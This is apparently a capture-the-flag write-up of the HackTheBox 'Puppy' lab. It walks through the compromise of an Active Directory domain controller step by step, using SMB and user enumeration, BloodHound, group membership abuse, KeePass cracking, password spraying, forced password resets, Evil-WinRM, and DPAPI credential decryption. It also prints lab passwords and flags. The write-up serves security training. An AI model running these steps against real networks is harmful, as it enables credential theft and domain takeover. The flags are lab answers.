# SUMMARY

This penetration test targeted the PUPPY.HTB domain, beginning with network reconnaissance that identified a Windows Server 2022 Domain Controller. Initial access was achieved through a compromised password for the user levi.james, which allowed enumeration of domain users and shares.

BloodHound analysis revealed that levi.james controlled the DEVELOPERS group, which possessed GenericWrite permissions over the HR group. This privilege was leveraged to add levi.james to the DEVELOPERS group, granting read access to the DEV share where a KeePass database was discovered and exfiltrated.

The KeePass database was successfully cracked, revealing credentials for multiple domain accounts. Password spraying authenticated the user ant.edwards, who had write permissions on the DEV share. Further BloodHound analysis showed ant.edwards was a member of the SENIOR DEVS group.

Using bloodyAD with ant.edwards' credentials, the ADAM.SILVER account was password-sprayed and re-enabled. This account had WinRM administrative access, providing initial command execution on the domain controller.

Privilege escalation to Domain Administrator was achieved by recovering DPAPI master keys and credential files from the steph.cooper context. Decryption of these credentials revealed the steph.cooper_adm password, which granted administrative access and allowed capture of the final root flag, demonstrating complete domain compromise.

# NMAP

The command sudo nmap -sC -sV 10.129.232.75 --open initiates a network scan with elevated privileges. The -sC option runs a suite of default Nmap scripts to gather additional information such as service banners and common vulnerabilities. The -sV option probes open ports to determine the service name and version details. The --open switch filters the output to display only ports that are in an open state, focusing the reconnaissance on active and accessible services. This scan provides a foundational map of the target's attack surface by enumerating running services and their specific versions.

```bash
sudo nmap -sC -sV  10.129.232.75  --open 
```

The Nmap scan results indicate the target is a Windows-based Active Directory Domain Controller for the domain PUPPY.HTB. Key services identified include DNS on port 53, Kerberos on port 88, and LDAP on ports 389 and 3268, which collectively confirm the host's role as a domain controller. The presence of SMB on ports 139 and 445 with signing enabled and required, along with Microsoft Windows RPC on port 135, further defines the Windows environment. The availability of WinRM on port 5985 provides a potential remote management entry point. The identification of the domain name is critical for subsequent Active Directory enumeration and Kerberos-based attacks.

```bash
3/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 21:31:58Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  status        1 (RPC #100024)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2025-11-11T21:33:52
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.96 seconds


```

The NetExec SMB enumeration confirms the target is a Windows Server 2022 domain controller for the domain PUPPY.HTB. The output verifies that SMB signing is enabled and required, which prevents certain relay attacks. This command successfully gathered the hostname and operating system version without requiring authentication, providing essential information for further targeted attacks against the SMB service.

```bash
 nxc smb 10.129.232.75                                                            
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
```

The command cat /etc/hosts displays the local DNS resolution entries. The output shows a manual mapping of the IP address 10.129.232.75 to the hostnames DC, PUPPY.HTB, and DC.puppy.htb. This configuration ensures the attacker's machine can correctly resolve the domain controller's hostname, which is a prerequisite for many Kerberos and Active Directory authentication-based attacks that require valid domain name resolution.

```bash
cat  /etc/hosts
10.129.232.75   DC  PUPPY.HTB DC.puppy.htb
```

The NetExec SMB command successfully authenticated to the domain controller using the credentials for the user levi.james. The operation enumerated the domain user accounts, revealing a total of eight accounts including the default Administrator and Guest accounts. The user list includes levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, and a separate administrative account named steph.cooper_adm. This user enumeration provides a target list for potential password spraying or brute-force attacks.

```bash
nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --users
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.75   445    DC               Administrator                 2025-02-19 19:33:28 0       Built-in account for administering the computer/domain 
SMB         10.129.232.75   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.75   445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account 
SMB         10.129.232.75   445    DC               levi.james                    2025-02-19 12:10:56 0        
SMB         10.129.232.75   445    DC               ant.edwards                   2025-02-19 12:13:14 0        
SMB         10.129.232.75   445    DC               adam.silver                   2025-11-11 21:34:29 0        
SMB         10.129.232.75   445    DC               jamie.williams                2025-02-19 12:17:26 0        
SMB         10.129.232.75   445    DC               steph.cooper                  2025-02-19 12:21:00 0        
SMB         10.129.232.75   445    DC               steph.cooper_adm              2025-03-08 15:50:40 0 

```

The command executed NetExec to enumerate domain users with the compromised levi.james credentials and piped the output to awk. The awk utility was configured to extract the fifth field, which corresponds to the username column from the previous enumeration. These extracted usernames were then redirected into a file named users.txt. This file creation is a standard post-enumeration step to compile a clean list of usernames for use in subsequent password attacks such as brute-forcing or password spraying.

```bash
nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --users | awk '{print $5}' >users.txt
```

The NetExec SMB share enumeration revealed several available shares. The user levi.james has READ access to the IPC$, NETLOGON, and SYSVOL shares, which is typical for a domain user. A non-standard share named DEV was identified with the remark "DEV-SHARE for PUPPY-DEVS". The administrative shares ADMIN$ and C$ are listed but were not accessible with the current user's privileges. The DEV share represents a potential target for further exploration to locate sensitive development files or scripts.

```bash
 nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --shares                             
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
```

The bloodhound-python command was executed to perform a comprehensive enumeration of the Active Directory environment. Using the compromised credentials for levi.james, the tool collected data for all available BloodHound collection methods against the domain puppy.htb, specifying the name server at the target IP. The operation completed successfully, compressing the harvested relationship data into a zip file for subsequent analysis within the BloodHound graphical interface to identify attack paths.

```bash
 bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d 'puppy.htb' -c All -ns 10.129.232.75   -v --zip

Compressing output into 20251111145410_bloodhound.zip
```

The BloodHound data analysis reveals that the user LEVI.JAMES@PUPPY.HTB is a member of the DEVELOPERS@PUPPY.HTB group. Furthermore, the DEVELOPERS group has GenericWrite permissions over the HR@PUPPY.HTB group. The GenericWrite privilege allows the members of the DEVELOPERS group to modify attributes of the HR group object, including its membership. This permission can be leveraged to add a user, such as levi.james, directly to the HR group, potentially granting them additional access rights within the domain.

![[Pasted image 20251111150805.png]]

The BloodHound data shows the membership of the DEVELOPERS@PUPPY.HTB group. The group contains two users: ADAM.SILVER@PUPPY.HTB and ANT.EDWARDS@PUPPY.HTB. This confirms that levi.james is not a direct member of the DEVELOPERS group but possesses control over it via another relationship, as previously identified.

![[Pasted image 20251111150533.png]]

The net rpc command is used to add the user LEVI.JAMES to the DEVELOPERS group. This operation leverages the SMB protocol to perform a remote group membership modification. The command authenticates to the target domain controller at 10.129.232.75 using the supplied credentials. Successfully adding the user to this group would grant them any permissions associated with the DEVELOPERS group, which includes the previously identified GenericWrite privilege over the HR group.

```bash
net rpc group addmem DEVELOPERS LEVI.JAMES -U 'puppy.htb\LEVI.JAMES%KingofAkron2025!' -S 10.129.232.75
```

The repeated SMB share enumeration shows a change in permissions for the DEV share. The user levi.james now has READ access to the DEV share, whereas in the previous enumeration, no permissions were listed for this share. This confirms that the user's recent addition to the DEVELOPERS group has successfully granted them read access to the development file share.

```bash
nxc smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --shares                                         
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
                                                                                             

```

The smbclient utility was used to interactively access the DEV share. The directory listing revealed a KeePass database file named recovery.kdbx and a KeePassXC installer. The recovery.kdbx file was successfully downloaded to the attacker's machine. This KeePass database is a high-value target as it potentially contains stored credentials, which can be targeted for offline cracking to obtain further credentials for the domain.

```bash
smbclient //10.129.232.75/DEV -U levi.james 
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 07:07:57 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

                5080575 blocks of size 4096. 1645032 blocks available
smb: \> get recovery.kdbx  
getting file \recovery.kdbx of size 2677 as recovery.kdbx (36.3 KiloBytes/sec) (average 36.3 KiloBytes/sec)
smb: \> exit
                              

```

The command keepass2john was executed to extract the cryptographic hash from the recovered KeePass database for offline password cracking. The operation failed because the tool does not support the database file version 40000, which corresponds to the KDBX 4 format used by KeePassXC. This indicates a newer database format that requires an updated version of the extraction tool or an alternative method to process the file.

```bash
keepass2john recovery.kdbx   > backup.hash
! recovery.kdbx : File version '40000' is currently not supported!
```

The command sudo git clone was used to download the keepass4brute tool from its GitHub repository. This tool is a Python script specifically designed to perform brute-force and dictionary attacks against KeePass 4 databases, which use the KDBX 4 file format. This action was taken to obtain a tool capable of processing the recovered recovery.kdbx file after the previous extraction attempt with keepass2john failed due to version incompatibility.

```bash

sudo git clone  https://github.com/r3nt0n/keepass4brute.git

```

The directory listing for the cloned keepass4brute repository shows the primary executable is a shell script named keepass4brute.sh, along with the standard LICENSE and README.md files. The presence of the shell script indicates the next step will involve executing this script to attempt a brute-force attack against the KeePass database.

```bash
──(.venv)─(kali㉿kali)-[~/Downloads/puppy/keepass4brute]
└─$ ls
keepass4brute.sh  LICENSE  README.md
```

The keepass4brute.sh script was executed against the recovery.kdbx database file using the rockyou.txt wordlist. The brute-force attack was successful, identifying the master password for the KeePass database as "liverpool" after testing only 36 passwords. This provides the credentials necessary to unlock and access the contents of the KeePass database.

```bash
./keepass4brute/keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt

keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 13 - Estimated time remaining: 109 weeks, 3 days
[+] Current attempt: liverpool

[*] Password found: liverpool

```

The command keepassxc recovery.kdbx was executed to open the KeePass database using the KeePassXC graphical application. This command would launch the interface, prompting for the master password which has been identified as "liverpool". Successfully opening the database would reveal any stored entries, such as usernames, passwords, and notes, which could contain credentials for other domain accounts or services.

```bash
keepassxc recovery.kbdx  
```

The KeePassXC database has been successfully unlocked, revealing multiple stored entries for domain users including ADAM SILVER, ANTONY EDWARDS, JAMIE WILLIAMS, SAMUEL, and STEVE T. The interface displays the general information tab for the ADAM SILVER entry, showing the username field is populated and the password field is currently concealed. The next step would be to view the actual password values for these entries to obtain additional domain credentials.

![[Pasted image 20251111182238.png]]

The files users.txt and password.txt have been created, containing a consolidated list of usernames and their corresponding passwords extracted from the KeePass database. The list includes the newly discovered users ANTONY C. EDWARDS, JAMIE WILLIAMSON, SAMUEL BLAKE, and STEVE TUCKER along with their credentials. This comprehensive credential dump provides multiple authenticated access vectors to the domain for further exploitation.

```bash
cat users.txt                             

Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
ANTONY C. EDWARDS
JAMIE WILLIAMSON
 SAMUEL BLAKE
STEVE TUCKER

 cat password.txt                          
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!


```

The NetExec password spraying attack was executed using the compiled list of usernames and passwords. The attack successfully validated the credentials for the user ant.edwards with the password Antman2025. The tool automatically continued testing other credential pairs after the successful authentication, demonstrating that the user ant.edwards now has a valid authenticated session against the SMB service.

```bash
nxc smb 10.129.232.75 -u 'users.txt' -p 'password.txt'  --continue-on-success 

SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE

```

The NetExec SMB authentication check for the user ant.edwards with the password Antman2025 was successful. This confirms that the credentials are valid and provides an authenticated session for the ant.edwards user account, which can be used for further enumeration or exploitation within the domain.

```bash
nxc smb 10.129.232.75 -u 'ant.edwards' -p 'Antman2025!'                                                  

SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
                                       

```

The SMB share enumeration with the ant.edwards credentials shows this user has READ and WRITE permissions on the DEV share. This elevated access level, compared to the previous READ-only permission held by levi.james, allows for file upload and modification within the development share, creating a potential avenue for further attack such as planting malicious files.

```bash
 nxc smb 10.129.232.75 -u 'ant.edwards' -p 'Antman2025!' --shares                              
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ,WRITE      DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
                                                                                                    

```

The smbclient session was initiated with the ant.edwards credentials, successfully accessing the DEV share. The directory listing shows the same contents as previously observed, including the KeePassXC installer, the Projects directory, and the recovery.kdbx file. The user's READ and WRITE permissions are confirmed by the ability to interact with the share, though no file operations were performed during this session.

```bash
smbclient //10.129.232.75/DEV -U ant.edwards
Password for [WORKGROUP\ant.edwards]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Wed Nov 12 01:36:29 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

                5080575 blocks of size 4096. 1641726 blocks available
smb: \> exit


```

The BloodHound data reveals that the user ANT.EDWARDS@PUPPY.HTB is a member of the SENIOR DEVS@PUPPY.HTB group. This group membership explains the elevated WRITE permissions on the DEV share that were previously observed. The SENIOR DEVS group also contains ADAM.SILVER@PUPPY.HTB as a member, indicating both users share the same level of resource access privileges.


![[Pasted image 20251111185058.png]]

The bloodyAD command was used to reset the password for the user ADAM.SILVER to a new value 'Password1234!'. This operation was performed with the authenticated credentials of ant.edwards, leveraging the user's privileges within the domain to modify another user's account attributes. The password change was successful, providing control over the ADAM.SILVER account.

```bash
bloodyAD --host 10.129.232.75  -d dc.puppy.htb  -u ant.edwards -p 'Antman2025!' set password ADAM.SILVER 'Password1234!'
[+] Password changed successfully!
```

The authentication attempt for ADAM.SILVER with the password 'Password1234!' failed because the account is currently disabled. The STATUS_ACCOUNT_DISABLED error indicates that while the credentials are correct, the account has been deactivated in Active Directory and cannot be used for authentication until it is re-enabled.

```bash
 nxc smb 10.129.232.75 -u 'ADAM.SILVER' -p 'Password1234!'                                      
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\ADAM.SILVER:Password123! STATUS_ACCOUNT_DISABLED 
```

The bloodyAD command was executed to remove the ACCOUNTDISABLE flag from the user account ADAM.SILVER using the UAC control modification feature. This operation successfully re-enabled the previously disabled ADAM.SILVER account, allowing it to be used for authentication once again. The change was performed with the ant.edwards credentials which possessed the necessary permissions to modify user account properties.

```bash
bloodyAD --host 10.129.232.75 -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac  -f ACCOUNTDISABLE  ADAM.SILVER
                                                 
```

The authentication check for ADAM.SILVER with the password 'Password1234!' was successful. This confirms that the account has been successfully re-enabled and the password reset is effective, providing authenticated access to the domain with the ADAM.SILVER account credentials

```bash
 nxc smb puppy.htb -u ADAM.SILVER -p Password1234!                                                                    
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ADAM.SILVER:Password1234! 
                                                                                    
```

The NetExec WinRM authentication check for ADAM.SILVER was successful and returned a "Pwn3d!" status. This indicates that the user ADAM.SILVER has administrative privileges over the target system via WinRM, allowing for remote code execution and full compromise of the domain controller.

```bash
 nxc winrm  puppy.htb -u ADAM.SILVER -p Password1234!                                                              
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\ADAM.SILVER:Password1234! (Pwn3d!)
```

The Evil-WinRM shell was successfully used to establish an interactive remote session on the domain controller as the user ADAM.SILVER. The command cat user.txt was executed, retrieving the user flag a1265f1b1c3ad42bc58cf732a2ef3776 from the adam.silver desktop. This confirms successful user-level compromise and flag capture.

```bash
evil-winrm -i 10.129.232.75  -u 'ADAM.SILVER' -p 'Password1234!'  

*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
a1265f1b1c3ad42bc58cf732a2ef3776
```

The site-backup-2024-12-30.zip file was successfully downloaded from the C:\Backups directory on the domain controller to the attacker's local machine. This backup file may contain sensitive configuration data, source code, or additional credentials that could be analyzed for further exploitation opportunities within the domain environment.

```bash
*Evil-WinRM* PS C:\Backups> download 'site-backup-2024-12-30.zip'
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
                                        
Info: Download successful!

```

The unzip command was executed to extract the contents of the site-backup-2024-12-30.zip archive. This operation will decompress the backup files, allowing for inspection of the contained web application source code, configuration files, and potentially sensitive data that could reveal additional vulnerabilities or credential information.

```bash
unzip site-backup-2024-12-30.zip   
```

The nms-auth-config.xml.bak file contains LDAP configuration details with embedded credentials. The configuration reveals a bind-dn of cn=steph.cooper,dc=puppy,dc=htb and a bind-password of ChefSteph2025!, providing plaintext credentials for the steph.cooper user account that can be used for LDAP authentication and potentially for other domain services.

```bash
cat nms-auth-config.xml.bak

<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>


```

The Evil-WinRM connection attempt was made using the credentials for steph.cooper with the password ChefSteph2025! obtained from the LDAP configuration backup file. This attempts to establish an authenticated remote session to the domain controller using these newly discovered credentials.

```bash
evil-winrm -i 10.129.232.75  -u 'steph.cooper' -p 'ChefSteph2025!'
```

The winPEASx64.exe privilege escalation enumeration script was successfully uploaded to the C:\ProgramData directory on the domain controller via the Evil-WinRM session. This prepares the system for local privilege escalation analysis by transferring the necessary tool to identify potential misconfigurations, vulnerable services, or insecure file permissions that could be exploited to gain higher privileges.

```bash
*Evil-WinRM* PS C:\ProgramData> upload winPEASx64.exe
```

The winPEASx64.exe script was executed on the domain controller to perform automated privilege escalation enumeration. This comprehensive tool analyzes the system configuration, services, processes, registry settings, and file permissions to identify potential security misconfigurations that could be exploited to elevate privileges from the current user context to a higher level of access, potentially even SYSTEM.

```bash
./winPEASx64.exe
```

The winPEAS output reveals DPAPI master keys and credential files associated with the steph.cooper user. Two credential files were identified: a Local Credential Data file and an Enterprise Credential Data file, both protected by the same master key. These DPAPI blobs potentially contain cached credentials or authentication tokens that could be extracted and decrypted to gain access to additional accounts or services.

```output
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================================

```

The DPAPI master key file was successfully copied from the steph.cooper user's Microsoft Protect directory to a file named "masterkey" in the current working directory. This master key can now be used with tools like Mimikatz to attempt decryption of the associated DPAPI credential files that were previously identified, potentially revealing cached passwords or authentication tokens

```bash
cp C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 masterkey
```

The attrib command was used to remove the system and hidden attributes from the masterkey file, making it visible for download. The file was then successfully downloaded from the domain controller to the attacker's local machine. This master key file can now be used with decryption tools to attempt to recover the credentials stored in the DPAPI blobs previously identified

```bash

attrib -s -h  masterkey
download masterkey

```

The two DPAPI credential files were successfully copied from their original locations in the steph.cooper user's profile to the C:\programdata directory. The local credential data file was copied as creds1 and the enterprise credential data file was copied as creds2, preparing them for download and subsequent decryption attempts using the previously obtained master key.

```bash
*Evil-WinRM* PS C:\programdata> cp C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D creds1
 
*Evil-WinRM* PS C:\programdata> cp C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 creds2
```

The system and hidden attributes were removed from both creds1 and creds2 files using the attrib command. Both DPAPI credential files were then successfully downloaded from the domain controller to the attacker's local machine. These files, along with the previously downloaded master key, are now ready for offline decryption to extract any stored credentials.

```bash
attrib -s -h  creds1
attrib -s -h  creds2
download creds1
download creds2
```

The dpapi.py tool successfully decrypted the master key using the user's password ChefSteph2025! and SID. The decrypted master key value is 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84. This decrypted key can now be used to decrypt the credential files creds1 and creds2 to recover their stored secrets.

```bash
 dpapi.py masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'


Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
                                                   

```

The dpapi.py tool successfully decrypted the enterprise credential file creds2 using the master key. The decryption revealed credentials for the steph.cooper_adm account with the password FivethChipOnItsWay2025!. This represents a privilege escalation opportunity as the steph.cooper_adm account likely has higher privileges than the current steph.cooper account.

```bash
dpapi.py credential -f creds2 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84


Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!


```

The Evil-WinRM session was successfully established using the steph.cooper_adm credentials. The command cat root.txt was executed from the Administrator desktop directory, retrieving the root flag e4513cedc826e49db6ebdf724d822a6a. This confirms full domain compromise and successful privilege escalation to domain administrator level access.

```bash
evil-winrm -i 10.129.232.75  -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e4513cedc826e49db6ebdf724d822a6a

```